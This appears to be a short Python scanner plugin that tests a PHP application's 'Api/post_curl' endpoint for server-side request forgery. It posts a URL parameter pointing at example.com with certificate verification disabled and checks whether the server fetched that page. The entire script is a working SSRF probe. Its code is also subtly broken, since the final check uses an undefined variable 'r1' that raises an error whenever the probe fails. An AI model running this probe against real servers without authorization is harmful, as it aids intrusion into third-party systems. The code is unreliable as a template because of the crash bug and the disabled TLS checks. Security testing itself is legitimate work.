import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php/index/Api/post_curl"
	body="url=http://example.com&data[]="
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "<title>Example Domain</title>" in response.text:
		r0=True
	else:
		r0=False
	if r0 or r1:
		return True
	else:
		return False
